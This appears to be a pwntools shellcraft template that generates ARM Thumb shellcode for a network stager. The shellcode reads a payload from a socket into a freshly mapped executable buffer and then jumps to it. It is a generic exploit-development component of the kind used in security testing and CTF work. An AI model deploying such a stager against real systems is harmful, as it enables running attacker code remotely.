<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft import thumb, arm %>
<%docstring>
    stager(sock, size)

    Read 'size' bytes from 'sock' and place them in an executable buffer and jump to it.
    The socket will be left in r6.
</%docstring>
<%page args="sock, size"/>
<%
    stager = common.label("stager")
    looplabel = common.label("read_loop")
%>
${stager}:
    /* Save socket */
    ${thumb.mov('r6', sock)}

    ${thumb.syscall('SYS_mmap2', 0, size, 'PROT_EXEC | PROT_WRITE | PROT_READ', 'MAP_ANONYMOUS | MAP_PRIVATE', 0xffffffff, 0)}

    /* Move size to loop counter */
    ${thumb.mov('r2', 'r1')}

    /* Save allocated memory address */
    ${thumb.mov('r8', 'r0')}
    ${thumb.mov('r1', 'r0')}

${looplabel}:
    ${thumb.syscall('SYS_read', 'r6', 'r1', 'r2')}

    /* Update remaining count and write-address */
    add r1, r1, r0
    subs r2, r2, r0

    /* Anything left to read */
    bne ${looplabel}

    /* call next stage with sock as an argument*/
    ${thumb.mov('r0', 'r6')}
    bx r8
